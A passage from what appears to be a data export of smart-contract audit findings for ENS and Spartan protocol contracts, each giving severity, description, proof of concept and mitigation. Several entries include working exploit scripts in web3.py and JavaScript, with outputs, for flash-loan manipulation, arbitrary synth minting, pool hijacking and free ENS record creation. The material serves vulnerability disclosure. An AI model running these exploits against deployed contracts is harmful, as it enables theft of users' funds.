The first dns name should come after the second, but `dnsCompare` returns `-1` (the first name to come before), because the length of the 2nd domain (49 characters) is ASCII character `1` and is not correctly masked off during strings comparision.

### Proof of Concept

git diff

<https://gist.github.com/panprog/32adefdc853ccd0fd0f1aad85c526bea>

then:

yarn test test/dnssec-oracle/TestSolidityTests.js

### Recommended Mitigation Steps

In addition to the incorrect condition, the mask calculation formula: `32 - shortest + idx` will also overflow since `shortest` can be more than `32`, so addition should be performed before subtractions.

                if (shortest - idx >= 32) {
                    mask = type(uint256).max;
                } else {
                    mask = ~(2 ** (8 * (idx + 32 - shortest)) - 1);
                }





***"
145.md,"`DNSSECImpl.verifySignature` compares strings incorrectly, allowing malicious zones to forge DNSSEC trust chain",medium,"*Submitted by GimelSec, also found by csanuragjain*

[DNSSECImpl.sol#L186-L190](https://github.com/code-423n4/2022-07-ens/blob/main/contracts/dnssec-oracle/DNSSECImpl.sol#L186-L190)<br>

DNSSEC allows parent zones to sign for its child zones. To check validity of a signature, RFC4034 3.1.7 requires the `Signer's Name` in any RRSIG RDATA to contain the zone of covered RRset. This requirement is reasonable since any child zone should be covered by its parent zone.

ENS tries to implement the concept of name coverage in `DNSSECImpl.verifySignature`, but unfortuantely does it wrong, resulting in possibiliy of coverage between two unrelated domains. In the worst case, an attacker can utilize this bug to forge malicious trust chains and authenticate invalid domains.

### Proof of Concept

In `DNSSECImpl.verifySignature`, ENS tries to verify the name of RRSet zone (`name`) is contained by Signer's Name (`rrset.signerName`).

        if(rrset.signerName.length > name.length
                || !rrset.signerName.equals(0, name, name.length - rrset.signerName.length))    //## This allows matches such as name=""SubString.com"" signerName=""String.com"", which is clearly incorrect, use label counts instead
            {
                revert InvalidSignerName(name, rrset.signerName);
            }

In DNS, for a parent zone to contain another child zone, we generally require the child zone to be a subdomain of the parent. For instance, `example.eth.` in considered to cover `sub.example.eth.`, while `xample.eth.` should not be cover `example.eth.`.

Unfortunately in the implementation shown above, both cases will path the check, and `ample.eth.` will be considered appropriate to sign for `example.eth.`. This is against the original design of DNS, and would result in breach of zone hierarchy.

In practice, the requirement to exploit this is a bit more complex. Since names are stored as a sequence of packed labels, `example.eth.` should be stored as `\x06example\x03eth\x00`, while `xample.eth.` is stored as `\x05xample\x03eth\x00`. Thus to successfully pull off the attack ,we have to make sure that the packed signer's name is actually a substring of child zone.

A simple (yet unrealistic) example can be like this `xample.eth.` can sign for `e\x05xample.eth.`, since packed format of those two names are `\x05xample\x03eth\x00` and `\x07e\x05ample\x03eth\x00`.

In general, it would require some effort for an attacker to find attackable zones, nevertheless, this should still be considered as a potential threat to the integrity of ENS.

### Recommended Mitigation Steps

Check label by label instead of comparing the entire name.<br>
To actually meet all requirements specified in RFC4034 and RFC4035, there are still a lot to do, but we will discuss that in a separate issue for clarity.





***"
145.md,`BytesUtils`: compare will not revert when the `offset` and `len` exceeds the bytes lengths,medium,"*Submitted by zzzitron*

[BytesUtils.sol#L44-L51](https://github.com/code-423n4/2022-07-ens/blob/ff6e59b9415d0ead7daf31c2ed06e86d9061ae22/contracts/dnssec-oracle/BytesUtils.sol#L44-L51)<br>

Compare will return false answer without reverting when the inputs are not valid.

### Proof of Concept

The `compare` function is used for `compareNames`. The names are supposed to be DNS wire format. If the strings are malformed, it is possible to give out-of-range `offset`, `len`, `otheroffset`, and `otherlen`. When it happens, the `compare` will return some false values, without reverting, since the validity of `offset` and `len` are not checked.

```solidity
// https://github.com/code-423n4/2022-07-ens/blob/ff6e59b9415d0ead7daf31c2ed06e86d9061ae22/contracts/dnssec-oracle/BytesUtils.sol#L44-L51
// dnssec-oracle/BytesUtils.sol::compare
// The length of self and other are not enforced

 44     function compare(bytes memory self, uint offset, uint len, bytes memory other, uint otheroffset, uint otherlen) internal pure returns (int) {
 45         uint shortest = len;
 46         if (otherlen < len)
 47         shortest = otherlen;
 48
 49         uint selfptr;
 50         uint otherptr;
```

### Recommended Mitigation Steps

Check whether the `offset`, `len` are within the length of `self`, as well as for the `other`.





***"
145.md,"If `PARENT_CANNOT_CONTROL` is set on subdomain, it can be unwrapped then wrapped by its owner and then parent can control it again before the expiry",medium,"*Submitted by panprog*

[NameWrapper.sol#L955-L961](https://github.com/code-423n4/2022-07-ens/blob/ff6e59b9415d0ead7daf31c2ed06e86d9061ae22/contracts/wrapper/NameWrapper.sol#L955-L961)<br>

There is a general incorrect logic of allowing to burn only `PARENT_CANNOT_CONTROL` fuse without burning `CANNOT_UNWRAP` fuse. If only `PARENT_CANNOT_CONTROL` fuse is burnt, then domain can be unwrapped by its owner and then wrapped again, which clears `PARENT_CANNOT_CONTROL` fuse, making it possible for parent to bypass the limitation of parent control before the expiry.

Bypassing parent control scenario:

1.  Alice registers and wraps `test.eth` domain
2.  Alice creates subdomain `bob.test.eth` and burns `PARENT_CANNOT_CONTROL` fuse with max expiry, transferring this domain to Bob
3.  At this point Bob can verify that he is indeed domain owner of `bob.test.eth` in `NameWrapper`, `PARENT_CANNOT_CONTROL` fuse is burnt for this domain and fuse expiry is set to expiry of `test.eth` domain. So Bob thinks his domain is secure and can not be taken from him before the expiry.
4.  Bob unwraps `bob.test.eth` domain.
5.  Bob wraps `bob.test.eth` domain, which clears fuses and expiry
6.  Alice changes `bob.test.eth` domain ownership to her breaking Bob's impression that his domain was secure until expiry.

### Proof of Concept

Copy this to test/wrapper and run:<br>
yarn test test/wrapper/NameWrapperBypassPCC.js

<https://gist.github.com/panprog/71dea0fd1875b4d7d5849f7da822ea8b>

### Recommended Mitigation Steps

Burning any fuse (including `PARENT_CANNOT_CONTROL`) must require `CANNOT_UNWRAP` fuse to be burned (because otherwise it's possible to unwrap+wrap to clear that fuse).

In `NameWrapper._canFusesBeBurned`, condition should be different:

        if (
            fuses & ~CANNOT_UNWRAP != 0 &&
            fuses & (PARENT_CANNOT_CONTROL | CANNOT_UNWRAP) !=
            (PARENT_CANNOT_CONTROL | CANNOT_UNWRAP)
        ) {
            revert OperationProhibited(node);
        }






***"
145.md,Wrong Equals Logic,medium,"*Submitted by 0x1f8b, also found by alan724*

[BytesUtils.sol#L115-L127](https://github.com/code-423n4/2022-07-ens/blob/ff6e59b9415d0ead7daf31c2ed06e86d9061ae22/contracts/dnssec-oracle/BytesUtils.sol#L115-L127)<br>

`equals` with offset might return true when `equals` without offset returns false.

### Proof of Concept

The problem is that `self.length` could be greater than `other.length + offset`, it should be `==`, or it should contain a length argument.

Here you have an example of the failure:

*   `equals(0x0102030000, 0, 0x010203)` => `return true`

```json
decoded input	{
	""bytes self"": ""0x0102030000"",
	""uint256 offset"": ""0"",
	""bytes other"": ""0x010203""
}
decoded output	{
	""0"": ""bool: true""
}
```

### Recommended Mitigation Steps

```diff
    function equals(bytes memory self, uint offset, bytes memory other) internal pure returns (bool) {
-       return self.length >= offset + other.length && equals(self, offset, other, 0, other.length);
+       return self.length == offset + other.length && equals(self, offset, other, 0, other.length);
    }
```





***"
145.md,The `unwrapETH2LD` use `transferFrom` instead of `safeTransferFrom` to transfer ERC721 token,medium,"*Submitted by 0x29A, also found by Amithuddar, benbaessler, berndartmueller, cccz, CRYP70, rbserver, RedOneN, and Sm4rty*

[NameWrapper.sol#L327-L346](https://github.com/code-423n4/2022-07-ens/blob/ff6e59b9415d0ead7daf31c2ed06e86d9061ae22/contracts/wrapper/NameWrapper.sol#L327-L346)<br>

The `unwrapETH2LD` use `transferFrom` to transfer ERC721 token, the `newRegistrant` could be an unprepared contract.

### Proof of Concept

Should a ERC-721 compatible token be transferred to an unprepared contract, it would end up being locked up there. Moreover, if a contract explicitly wanted to reject ERC-721 safeTransfers.<br>
Plus take a look to [the OZ safeTransfer comments](https://docs.openzeppelin.com/contracts/4.x/api/token/erc721#IERC721-transferFrom-address-address-uint256-):<br>
`Usage of this method is discouraged, use safeTransferFrom whenever possible.`

### Recommended Mitigation Steps

```diff
    function unwrapETH2LD(
        bytes32 labelhash,
        address newRegistrant,
        address newController
    ) public override onlyTokenOwner(_makeNode(ETH_NODE, labelhash)) {
        _unwrap(_makeNode(ETH_NODE, labelhash), newController);
-       registrar.transferFrom(
+       registrar.safeTransferFrom(
            address(this),
            newRegistrant,
            uint256(labelhash)
        );
    }
```






***"
145.md,Incorrect implementation of `RRUtils.serialNumberGte`,medium,"*Submitted by GimelSec, also found by Lambda and zzzitron*

[RRUtils.sol#L266-L268](https://github.com/code-423n4/2022-07-ens/blob/main/contracts/dnssec-oracle/RRUtils.sol#L266-L268)<br>

Comparing serial numbers should follow RFC1982 due to the possibility of numbers wrapping around. `RRUtils.serialNumberGte` tried to follow the RFC but failed to do so, leading to incorrect results in comparison.

### Proof of Concept

For a serial number i1 to be greater than i2, the rules provided by RFC1982 is as follow<br>
`((i1 < i2) && ((i2 - i1) > (2**31))) || ((i1 > i2) && ((i1 - i2) < (2**31)))`

ENS implements `int32(i1) - int32(i2) > 0`, which will suffer from revert in cases such as `i1=0x80000000, i2=0x7fffffff`

### Recommended Mitigation Steps

Use the naive implementation instead<br>
`return (i1 == i2) || ((i1 < i2) && ((i2 - i1) > (2**31))) || ((i1 > i2) && ((i1 - i2) < (2**31)));`






***"
145.md,"The preimage DB (i.e., `NameWrapper.names`) can be maliciously manipulated/corrupted",medium,"*Submitted by PwnedNoMore*

[NameWrapper.sol#L520](https://github.com/code-423n4/2022-07-ens/blob/ff6e59b9415d0ead7daf31c2ed06e86d9061ae22/contracts/wrapper/NameWrapper.sol#L520)<br>

By design, the `NameWrapper.names` is used as a preimage DB so that the client can query the domain name by providing the token ID. The name should be correctly stored. To do so, the `NameWrapper` record the domain's name every time it gets wrapped. And as long as all the parent nodes are recorded in the DB, wrapping a child node will be very efficient by simply querying the parent node's name.

However, within a malicious scenario, it is possible that a subdomain can be wrapped without recording its info in the preimage DB.

Specifically, when `NameWrappper.setSubnodeOwner` / `NameWrappper.setSubnodeRecord` on a given subdomain, the following code is used to check whether the subdomain is wrapped or not. The preimage DB is only updated when the subdomain is not wrapped (to save gas I beieve).

```solidity
function setSubnodeOwner(
    bytes32 parentNode,
    string calldata label,
    address newOwner,
    uint32 fuses,
    uint64 expiry
)
    public
    onlyTokenOwner(parentNode)
    canCallSetSubnodeOwner(parentNode, keccak256(bytes(label)))
    returns (bytes32 node)
{
    bytes32 labelhash = keccak256(bytes(label));
    node = _makeNode(parentNode, labelhash);
    (, , expiry) = _getDataAndNormaliseExpiry(parentNode, node, expiry);
    if (ens.owner(node) != address(this)) {
        ens.setSubnodeOwner(parentNode, labelhash, address(this));
        _addLabelAndWrap(parentNode, node, label, newOwner, fuses, expiry);
    } else {
        _transferAndBurnFuses(node, newOwner, fuses, expiry);
    }
}
```

However, the problem is that `ens.owner(node) != address(this)` is not sufficient to check whether the node is alreay wrapped. The hacker can manipulate this check by simply invoking `EnsRegistry.setSubnodeOwner` to set the owner as the `NameWrapper` contract without wrapping the node.

Consider the following attack scenario.

*   the hacker registers a 2LD domain, e.g., `base.eth`
*   he assigns a subdomain for himself, e.g., `sub1.base.eth`
    *   the expiry of `sub1.base.eth` should be set as expired shortly
    *   note that the expiry is for `sub1.base.eth` instead of `base.eth`, so it is safe to make it soonly expired
*   the hacker waits for expiration and unwraps his `sub1.base.eth`
*   the hacker invokes `ens.setSubnodeOwner` to set the owner of `sub2.sub1.base.eth` as NameWrapper contract
*   the hacker re-wraps his `sub1.base.eth`
*   the hacker invokes `nameWrapper.setSubnodeOwner` for `sub2.sub1.base.eth`
    *   as such, `names[namehash(sub2.sub1.base.eth)]` becomes empty
*   the hacker invokes `nameWrapper.setSubnodeOwner` for `eth.sub2.sub1.base.eth`.
    *   as such, `names[namehash(eth.sub2.sub1.base.eth)]` becomes `\x03eth`

It is not rated as a High issue since the forged name is not valid, i.e., without the tailed `\x00` (note that a valid name should be like `\x03eth\x00`). However, the preimage BD can still be corrupted due to this issue.

### Suggested Fix

When wrapping node `X`, check whether `NameWrapper.names[X]` is empty directly, and update the preimage DB if it is empty.

### Proof of Concept / Attack Scenario

For full details, please see [original warden submission](https://github.com/code-423n4/2022-07-ens-findings/issues/197).





***"
145.md,`ERC1155Fuse`: `_transfer` does not revert when sent to the old owner,medium,"*Submitted by zzzitron*

The `safeTransferFrom` does not comply with the ERC1155 standard when the token is sent to the old owner.

### Proof of Concept

According to the EIP-1155 standard for the `safeTransferFrom`:

> MUST revert if balance of holder for token `_id` is lower than the `_value` sent.

Let's say `alice` does not hold any token of `tokenId`, and `bob` holds one token of `tokenId`. Then alice tries to send one token of `tokenId` to bob with `safeTranferFrom(alice, bob, tokenId, 1, """")`.  In this case, even though alice's balance (= 0) is lower than the amount (= 1) sent, the `safeTransferFrom` will not revert. Thus, violating the EIP-1155 standard.<br>
It can cause problems for other contracts using this token, since they assume the token was transferred if the `safeTransferFrom` does not revert. However, in the example above, no token was actually transferred.

```solidity
// https://github.com/code-423n4/2022-07-ens/blob/ff6e59b9415d0ead7daf31c2ed06e86d9061ae22/contracts/wrapper/ERC1155Fuse.sol#L274-L284
// wrapper/ERC1155Fuse.sol::_transfer
// ERC1155Fuse::safeTransferFrom uses _transfer

274     function _transfer(
275         address from,
276         address to,
277         uint256 id,
278         uint256 amount,
279         bytes memory data
280     ) internal {
281         (address oldOwner, uint32 fuses, uint64 expiry) = getData(id);
282         if (oldOwner == to) {
283             return;
284         }
```

### Recommended Mitigation Steps

Revert even if the `to` address already owns the token.





***"
145.md,Users can create extra ENS records at no cost,medium,"*Submitted by wastewa, also found by bin2chen, Limbooo, PwnedNoMore, and ronnyx2017*

[ETHRegistrarController.sol#L249-L268](https://github.com/code-423n4/2022-07-ens/blob/ff6e59b9415d0ead7daf31c2ed06e86d9061ae22/contracts/ethregistrar/ETHRegistrarController.sol#L249-L268)<br>
[ETHRegistrarController.sol#L125](https://github.com/code-423n4/2022-07-ens/blob/ff6e59b9415d0ead7daf31c2ed06e86d9061ae22/contracts/ethregistrar/ETHRegistrarController.sol#L125)<br>
[BaseRegistrarImplementation.sol#L106](https://github.com/code-423n4/2022-07-ens/blob/ff6e59b9415d0ead7daf31c2ed06e86d9061ae22/contracts/ethregistrar/BaseRegistrarImplementation.sol#L106)<br>

Users using the `register` function in `ETHRegistrarController.sol`, can create an additional bogus ENS entry (Keep the ERC721 and all the glory for as long as they want) for free by exploiting the `functionCall` in the `_setRecords` function.<br>
The only check there (in the setRecord function) is that the nodehash matches the originally registered ENS entry, this is extremely dangerous because the rest of the functionCall is not checked and the controller has very elevated privileges in ENS ecosystem (and probably beyond).

The single exploit I am showing is already very bad, but I expect there will be more if this is left in. An example of a potential hack is that some of the functions in other ENS contracts (which give the RegistrarController elevated privilege) have dynamic types as the first variables--if users can generate a hash that is a low enough number, they will be able to unlock more exploits in the ENS ecosystem because of how dynamic types are abi encoded.  Other developers will probably also trust the `ETHRegistrarController.sol`, so other unknown dangers may come down the road.

The exploit I made (full code in PoC) can mint another ENS entry and keep it for as long as it wants, without paying more--will show code below.

### Proof of Concept

Put this code in the `TestEthRegistrarController.js` test suite to run. I just appended this to tests at the bottom of file.

I called the `BaseRegistrarImplementation.register` function with the privileges of `ETHRegistrarController` by passing the base registrar's address as the `resolver` param in the `ETHRegistrarController.register` function call. I was able to set a custom duration at no additional cost.

The final checks of the PoC show that we own two new ENS entries from a single `ETHRegistrarController.register` call. The labelhash of the new bogus ENS entry is the nodehash of the first registered ENS entry.

```js
  it('Should allow us to make bogus erc721 token in ENS contract', async () => {
    const label = 'newconfigname'
    const name = `${label}.eth`
    const node = namehash.hash(name)
    const secondTokenDuration = 788400000 // keep bogus NFT for 25 years;

    var commitment = await controller.makeCommitment(
      label,
      registrantAccount,
      REGISTRATION_TIME,
      secret,
      baseRegistrar.address,
      [
        baseRegistrar.interface.encodeFunctionData('register(uint256,address,uint)', [
          node,
          registrantAccount,
          secondTokenDuration
        ]),
      ],
      false,
      0,
      0
    )
    var tx = await controller.commit(commitment)
    expect(await controller.commitments(commitment)).to.equal(
      (await web3.eth.getBlock(tx.blockNumber)).timestamp
    )

    await evm.advanceTime((await controller.minCommitmentAge()).toNumber())
    var balanceBefore = await web3.eth.getBalance(controller.address)

    let tx2 = await controller.register(
      label,
      registrantAccount,
      REGISTRATION_TIME,
      secret,
      baseRegistrar.address,
      [
        baseRegistrar.interface.encodeFunctionData('register(uint256,address,uint)', [
          node,
          registrantAccount,
          secondTokenDuration
        ]),
      ],
      false,
      0,
      0,
      { value: BUFFERED_REGISTRATION_COST }
    )

    expect(await nameWrapper.ownerOf(node)).to.equal(registrantAccount)
    expect(await ens.owner(namehash.hash(name))).to.equal(nameWrapper.address)


    expect(await baseRegistrar.ownerOf(node)).to.equal( // this checks that bogus NFT is owned by us
      registrantAccount
    )
    expect(await baseRegistrar.ownerOf(sha3(label))).to.equal(
      nameWrapper.address
    )
  })
```

### Tools Used

chai tests in repo

### Recommended Mitigation Steps

I recommend being stricter on the signatures of the user-provided `resolver` and the function that is being called (like safeTransfer calls in existing token contracts).<br>
An example of how to do this is by creating an interface that ENS can publish for users that want to compose their own resolvers and call that instead of a loose functionCall. Users will be free to handle data however they like, while restricting the space of things that can go wrong.

I will provide a loose example here:

    interface IUserResolver {
        function registerRecords(bytes32 nodeId, bytes32 labelHash, bytes calldata extraData)

    }







***"
20.md,`SynthVault` withdraw forfeits rewards,high,"The `SynthVault.withdraw` function does not claim the user's rewards. It decreases the user's weight and therefore they are forfeiting their accumulated rewards.
The `synthReward` variable in `_processWithdraw` is also never used - it was probably intended that this variable captures the claimed rewards.

Usually, withdrawal functions claim rewards first but this one does not. A user that withdraws loses all their accumulated rewards.

Recommend claiming the rewards with the user's deposited balance first in `withdraw`."
20.md,`Pool.sol` & `Synth.sol`: Failing Max Value Allowance,high,"In the `_approve` function, if the allowance passed in is `type(uint256).max`, nothing happens (ie. allowance will still remain at previous value). Contract integrations (DEXes for example) tend to hardcode this value to set maximum allowance initially, but this will result in zero allowance given instead.

This also makes the comment `// No need to re-approve if already max` misleading, because the max allowance attainable is `type(uint256).max - 1`, and re-approval does happen in this case.

This affects the `approveAndCall` implementation since it uses `type(uint256).max` as the allowance amount, but the resulting allowance set is zero.

Recommend keeping it simple and removing the condition.

```jsx
function _approve(address owner, address spender, uint256 amount) internal virtual {
    require(owner != address(0), ""!owner"");
    require(spender != address(0), ""!spender"");
    _allowances[owner][spender] = amount;
    emit Approval(owner, spender, amount);
}
```"
20.md,Result of `transfer` / `transferFrom` not checked,high,"A call to `transferFrom` or `transfer` is frequently done without checking the results. For certain ERC20 tokens, if insufficient tokens are present, no revert occurs but a result of ""false"" is returned. It's important to check this. If you don't, you could mint tokens without have received sufficient tokens to do so and could loose funds. Its also a best practice to check this.

Recommend always checking the result of `transferFrom` and `transfer`."
20.md,Members lose SPARTA tokens in `removeLiquiditySingle()`,high,"When a member calls `removeLiquiditySingle()` requesting only SPARTA in return, i.e. `toBASE` = true, the LP tokens are transferred to the Pool to withdraw the constituent SPARTA and TOKENs back to the Router. The withdrawn TOKENs are then transferred back to the Pool to convert to SPARTA and directly transferred to the member from the Pool. However, the member’s SPARTA are left behind in the Router instead of being returned along with converted SPARTA from the Pool.

In other words, the `_member`'s BASE SPARTA tokens that were removed from the Pool along with the TOKENs are never sent back to the` _member` because the `_token`'s transferred to the Pool are converted to SPARTA and only those are sent back to member directly from the Pool via `swapTo()`.

This effectively results in member losing the SPARTA component of their Pool LP tokens which get left behind in the Router and are possibly claimed by future transactions that remove SPARTA from Router.

[LPs sent to Pool](https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Router.sol#L121), [SPARTA and TOKENs withdrawn from Pool to Router](https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Router.sol#L122), [TOKENs from Router sent to Pool](https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Router.sol#L126), and [TOKENs in Pool converted to BASE SPARTA and sent to member directly from the Pool](https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Router.sol#L127).

**Recommend**:
1. BASE SPARTA should also be transferred to the Pool before `swapTo()` so they get sent to the member along with the converted TOKENs via `swapTo()`
2. Use `swap(BASE)` instead of `swapTo()` so that TOKENs are swapped for BASE SPARTA in Pool and sent back to ROUTER. Then send all the SPARTA from ROUTER to member."
20.md,Synth `realise` is vulnerable to flash loan attacks,high,"delamo_

Synth `realise` function calculates `baseValueLP` and `baseValueSynth` base on AMM spot price which is vulnerable to flash loan attack. `Synth`'s lp is subject to `realise` whenever the AMM ratio is different than Synth's debt ratio.

The attack does not necessarily require a flash loan. A big whale of the lp token holders could keep calling `realise` by shifting token ratio of AMM pool back and forth.

The vulnerability is located at `Synth.sol` [L187-L199](https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Synth.sol#L187-L199). Where the formula [here](https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Utils.sol#L114-L126) is dangerous.

Here's a script for conducting flashloan attack:
```python
flashloan_amount = init_amount
user = w3.eth.accounts[0]
marked_token.functions.transfer(user, flashloan_amount).transact()
marked_token.functions.transfer(token_pool.address, flashloan_amount).transact({'from': user})
token_pool.functions.addForMember(user).transact({'from': user})
received_lp = token_pool.functions.balanceOf(user).call()
synth_balance_before_realise = token_synth.functions.mapSynth_LPBalance(token_pool.address).call()
token_synth.functions.realise(token_pool.address).transact()
token_pool.functions.transfer(token_pool.address, received_lp).transact({'from': user})
token_pool.functions.removeForMember(user).transact({'from': user})
token_synth.functions.realise(token_pool.address).transact()
synth_balance_after_realise = token_synth.functions.mapSynth_LPBalance(token_pool.address).call()
print('synth_lp_balance_after_realise', synth_balance_after_realise)
print('synth_lp_balance_before_realise', synth_balance_before_realise)

```
Output:
```
synth_balance_after_realise 1317859964829313908162
synth_balance_before_realise 2063953488372093023256
```

Calculating Lp token's value base on AMM protocol is known to be dangerous.
There are a few steps that might solve the issue:
1. calculate token's price from a reliable source.  Implement a TWAP oracle or uses chainlink oracle.
2. calculate lp token value based on anti-flashloan formula.  Alpha finance's formula is a good reference: https://blog.alphafinance.io/fair-lp-token-pricing"
20.md,`SynthVault` rewards can be gamed,high,"The `SynthVault._deposit` function adds `weight` for the user that depends on the spot value of the deposit synth amount in `BASE`.

This spot price can be manipulated and the cost of manipulation is relative to the pool's liquidity.
However, the reward (see `calcReward`) is measured in BASE tokens unrelated to the pool.
Therefore, if the pool's liquidity is low and the reward reserve is high, the attack can be profitable:

1. Manipulate the pool spot price of the `iSYNTH(_synth).LayerONE()` pool by dripping a lot of `BASE` into it repeatedly (sending lots of smaller trades is less costly due to the [path-independence of the continuous liquidity model](https://docs.thorchain.org/thorchain-finance/continuous-liquidity-pools)). This increases the `BASE` per `token` price.
2. Call `SynthVault.depositForMember` and deposit a _small_ amount of synth token. The `iUTILS(_DAO().UTILS()).calcSpotValueInBase(iSYNTH(_synth).LayerONE(), _amount)` will return an inflated weight due to the price.
3. Optionally drip more `BASE` into the pool and repeat the deposits
4. Drip back `token` to the pool to rebalance it

The user's `weight` is now inflated compared to the deposited / locked-up amount and they can claim a large share of the rewards. The cost of the attack depends on the pool's liquidity and the profit depends on the reserve. It could therefore be profitable under certain circumstances.

Recommend tracking a TWAP price of the synth instead, store the deposited synths instead, and compute the weight & total weight on the fly based on the TWAP * deposit amount instead of at the time of deposit."
20.md,Missing slippage checks,high,"There are no minimum amounts out, or checks that frontrunning/slippage is sufficiently mitigated.
This means that anyone with enough capital can force arbitrarily large slippage by sandwiching transactions, close to 100%. See issue page for referenced code.

Recommend adding a minimum amount out parameter. The function reverts if the minimum amount isn't obtained.


> We acknowledge the issue for the protocol's AMM, but if this becomes a large issue in the future, the router is easily upgradeable to include a minimum rate parameter.


> Have changed this to confirmed; even though we already were aware of it; we have discussed and are happy to add in a UI-handed arg for minAmount now rather than reactively in the future. Disagree with severity though; this wasn't a problem with V1 at all."
20.md,Dividend reward can be gamed,high,"The `Router.addDividend` function tells the reserve to send dividends to the pool depending on the fees.

- The attacker provides LP to a curated pool. Ideally, they become a large LP holder to capture most of the profit, they should choose the smallest liquidity pool as the dividends are pool-independent.
- The `normalAverageFee` variable that determines the pool dividends can be set to zero by the attacker by trading a single wei in the pool `arrayFeeSize` (20) times (use `buyTo`). The fees of the single wei trades will be zero and thus the `normalAverageFee` will also be zero as, see `addTradeFee`.
- The attacker then does a trade that generates some non-zero fees, setting the `normalAverageFee` to this trade's fee. The `feeDividend` is then computed as `_fees * dailyAllocation / (_fees + normalAverageFee) = _fees * dailyAllocation / (2 * _fees) = dailyAllocation / 2`. Half of the `dailyAllocation` is sent to the pool.
- The attacker repeats the above steps until the reserve is almost empty. Each time the `dailyAllocation` gets smaller but it's still possible to withdraw almost all of it.
- They redeem their LP tokens and gain a share of the profits

The reserve can be emptied by the attacker.

Counting only the last 20 trades as a baseline for the dividends does not work. It should probably average over a timespan but even that can be gamed if it is too short.
I think a better idea is to compute the dividends based on **volume** traded over a timespan instead of looking at individual trades."
20.md,arbitrary synth mint/burn from pool,high,"`Pool` can mint arbitrary `Synth` provided as long as it's a valid synth. When there are multiple curated pools and synth (which the protocol is designed for), hackers can mint expensive synthetics from a cheaper AMM pool. The hacker can burn the minted synth at the expensive pool and get profit. The arbitrage profit can be amplified with flash loan services and break all the pegs.

[Pool's mintSynth logic](https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/Pool.sol#L229-L242), [Synth's mintSynth logic](https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Synth.sol#L165-L171), and [Synth's authorization logic](https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Pool.sol#L229-L242).


The price of the synthetics to be mint is calculated in `Pool` based on the AMM price of the current Pool

Here's a web3.py script of minting arbitrary `Synth` in a pool.
For simplicity, two pools are set with the assumption that link is 10x expensive than dai.

```python
sparta_amount = 100 * 10**18
initail_link_synth = link_synth.functions.balanceOf(user).call()
base.functions.transfer(link_pool.address, sparta_amount).transact({'from': user})
link_pool.functions.mintSynth(link_synth.address, user).transact({'from': user})
after_link_synth = link_synth.functions.balanceOf(user).call()

print('get link synth amount from link pool:', after_link_synth - initail_link_synth)

sparta_amount = 100 * 10**18
initail_link_synth = link_synth.functions.balanceOf(user).call()
base.functions.transfer(dai_pool.address, sparta_amount).transact({'from': user})
dai_pool.functions.mintSynth(link_synth.address, user).transact({'from': user})
after_link_synth = link_synth.functions.balanceOf(user).call()

print('get link synth amount from dai pool:', after_link_synth - initail_link_synth)

```

The log of the above script
```solidity
get link synth amount from link pool: 97078046905036524413
get link synth amount from dai pool: 970780469050365244136
```
Recommend Checking the provided synth's underlying token in `mintSynth`
```solidity
require(iSYNTH(synthOut).LayerONE() == TOKEN, ""invalid synth"");
```"
20.md,Hijack token pool by burning liquidity token,high,"`Pool` allows users to burn lp tokens without withdrawing the tokens. This allows the hacker to mutate the pools' rate to a point that no one can get any lp token anymore (even if depositing token).

The liquidity tokens are calculated at `Utils:calcLiquidityUnits`
```solidity
// units = ((P (t B + T b))/(2 T B)) * slipAdjustment
// P * (part1 + part2) / (part3) * slipAdjustment
uint slipAdjustment = getSlipAdustment(b, B, t, T);
uint part1 = t*(B);
uint part2 = T*(b);
uint part3 = T*(B)*(2);
uint _units = (P * (part1 + (part2))) / (part3);
return _units * slipAdjustment / one;  // Divide by 10**18
```
where `P` stands for `totalSupply` of current Pool. If `P` is too small (e.g, 1) then all the units would be rounding to 0.

Since any person can create a `Pool` at `PoolFactory`, hackers can create a Pool and burn his lp and set `totalSupply` to 1. He will be the only person who owns the Pool's lp from now on. [Pool's burn logic](https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Pool.sol#L146) and [Utils' lp token formula](https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Utils.sol#L80).

Here's a script of a user depositing 1M token to a pool where `totalSupply` equals 1

```solidity
dai_pool.functions.burn(init_amount-1).transact()
print('total supply', dai_pool.functions.totalSupply().call())
dai.functions.transfer(dai_pool.address, 1000000 * 10**18).transact()
dai_pool.functions.addForMember(user).transact()
print('lp received from depositing 1M dai: ', dai_pool.functions.balanceOf(user).call())
```

Output:
```solidity
total supply 1
lp received from depositing 1M dai:  0
```

Recommend removing `burn` or restrict it to privileged users only."
20.md,Misuse of AMM model on minting `Synth` (resubmit to add more detail),high,"`Pool` calculates the amount to be minted based on `token_amount` and `sparta_amount` of the Pool. However, since `token_amount` in the pool would not decrease when users mint `Synth`, it's always cheaper to mint `synth` than swap the tokens.

The synthetics would be really hard to be on peg. Or, there would be a flash-loan attacker to win all the arbitrage space.

In [Pool's mint `synth`](https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Pool.sol#L229-L242), The `synth` amount is calculated at L:232
```solidity
uint output = iUTILS(_DAO().UTILS()).calcSwapOutput(_actualInputBase, baseAmount, tokenAmount);
```
which is the same as swapping base to token at L:287
```solidity
uint256 _X = baseAmount;
uint256 _Y = tokenAmount;
_y =  iUTILS(_DAO().UTILS()).calcSwapOutput(_x, _X, _Y); // Calc TOKEN output
```

However, while swapping tokens decrease pool's token, mint just mint it out of the air.

Here's a POC:
Swap sparta to token for ten times
```python
for i in range(10):
    amount = 10 * 10**18
    transfer_amount = int(amount/10)
    base.functions.transfer(token_pool.address, transfer_amount).transact()
    token_pool.functions.swapTo(token.address, user).transact()
```

Mint `Synth` for ten times
```python
for i in range(10):
    amount = 10 * 10**18
    transfer_amount = int(amount/10)
